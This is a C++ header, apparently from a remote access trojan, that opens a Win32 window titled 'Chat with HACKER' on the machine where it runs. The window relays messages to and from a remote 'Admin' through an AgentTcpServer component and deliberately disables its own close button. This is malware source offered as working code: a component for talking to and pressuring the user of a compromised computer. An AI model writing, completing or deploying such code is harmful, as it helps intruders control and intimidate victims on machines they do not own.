#pragma once
#include <windows.h>
#include <string>
#include <thread>
#include <vector>
#include "AgentTcpServer.h"

// ID các control
#define IDC_CHAT_HISTORY 101
#define IDC_CHAT_INPUT 102
#define IDC_BTN_SEND 103

class ChatManager
{
private:
    static inline HWND hWindow = NULL;
    static inline HWND hHistory = NULL;
    static inline HWND hInput = NULL;
    static inline std::thread uiThread;
    static inline bool isRunning = false;

    // --- HÀM CHUYỂN ĐỔI MÃ (UTF-8 <-> Unicode) ---

    // 1. Chuyển từ std::string (UTF-8) sang std::wstring (Unicode) để hiển thị
    static std::wstring ToWide(const std::string &str)
    {
        if (str.empty())
            return L"";
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
        std::wstring wstrTo(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
        return wstrTo;
    }

    // 2. Chuyển từ std::wstring (Unicode) sang std::string (UTF-8) để gửi đi
    static std::string ToUtf8(const std::wstring &wstr)
    {
        if (wstr.empty())
            return "";
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }

    // Xử lý sự kiện cửa sổ
    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
        switch (uMsg)
        {
        case WM_COMMAND:
            if (LOWORD(wParam) == IDC_BTN_SEND)
            {
                // Lấy độ dài text trong ô input
                int len = GetWindowTextLengthW(hInput);
                if (len > 0)
                {
                    std::vector<wchar_t> buffer(len + 1);
                    GetWindowTextW(hInput, &buffer[0], len + 1);

                    std::wstring wMsg(&buffer[0]);

                    // Chuyển sang UTF-8 để gửi cho Web Client
                    std::string msgUtf8 = ToUtf8(wMsg);

                    if (!msgUtf8.empty())
                    {
                        // Gửi về Client
                        AgentTcpServer::instance().sendJson({{"type", "chat_message"},
                                                             {"text", msgUtf8}});

                        // Hiển thị lên ô History (Dùng chuỗi Unicode gốc)
                        AppendText(L"Me: " + wMsg);
                        SetWindowTextW(hInput, L""); // Xóa input
                    }
                }
            }
            break;
        case WM_CLOSE:
            // Chặn nút X
            return 0;
        case WM_DESTROY:
            isRunning = false;
            PostQuitMessage(0);
            return 0;
        }
        return DefWindowProcW(hwnd, uMsg, wParam, lParam); // Dùng DefWindowProcW
    }

    static void UIThreadFunc()
    {
        // Đăng ký lớp cửa sổ (Dùng phiên bản W - Unicode)
        WNDCLASSW wc = {0};
        wc.lpfnWndProc = WindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = L"RatChatWindow"; // Chuỗi L""
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        RegisterClassW(&wc);

        // Tạo cửa sổ (Dùng phiên bản W)
        // Dùng font mặc định của hệ thống để hỗ trợ tiếng Việt tốt hơn
        hWindow = CreateWindowExW(0, L"RatChatWindow", L"   Chat with HACKER", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                  100, 100, 400, 500, NULL, NULL, wc.hInstance, NULL);

        // Tạo Font (Segoe UI cho đẹp và chuẩn tiếng Việt)
        HFONT hFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                                  OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                                  DEFAULT_PITCH | FF_SWISS, L"Segoe UI");

        // Tạo khung lịch sử
        hHistory = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
                                 10, 10, 360, 380, hWindow, (HMENU)IDC_CHAT_HISTORY, wc.hInstance, NULL);
        SendMessageW(hHistory, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Tạo ô nhập liệu
        hInput = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                               10, 400, 280, 30, hWindow, (HMENU)IDC_CHAT_INPUT, wc.hInstance, NULL);
        SendMessageW(hInput, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Tạo nút Gửi
        HWND hBtn = CreateWindowW(L"BUTTON", L"Gửi", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                                  300, 400, 70, 30, hWindow, (HMENU)IDC_BTN_SEND, wc.hInstance, NULL);
        SendMessageW(hBtn, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Message Loop
        MSG msg = {0};
        while (GetMessageW(&msg, NULL, 0, 0))
        { // GetMessageW
            TranslateMessage(&msg);
            DispatchMessageW(&msg); // DispatchMessageW
        }

        hWindow = NULL;
    }

public:
    static void Start()
    {
        if (isRunning)
            return;
        isRunning = true;
        uiThread = std::thread(UIThreadFunc);
        uiThread.detach();
    }

    static void Stop()
    {
        if (hWindow)
        {
            SendMessage(hWindow, WM_DESTROY, 0, 0);
            isRunning = false;
        }
    }

    // Hàm nhận tin từ bên ngoài (Admin gửi tới) - Input là UTF-8
    static void AppendText(const std::string &textUtf8)
    {
        if (!hWindow || !hHistory)
            return;
        // Chuyển UTF-8 -> Unicode để hiển thị đúng
        std::wstring wText = ToWide(textUtf8);
        AppendText(wText);
    }

    // Hàm nội bộ hiển thị chuỗi Unicode
    static void AppendText(const std::wstring &wText)
    {
        if (!hWindow || !hHistory)
            return;

        int len = GetWindowTextLengthW(hHistory);
        SendMessageW(hHistory, EM_SETSEL, (WPARAM)len, (LPARAM)len);

        std::wstring line = wText + L"\r\n";
        SendMessageW(hHistory, EM_REPLACESEL, 0, (LPARAM)line.c_str());
    }
};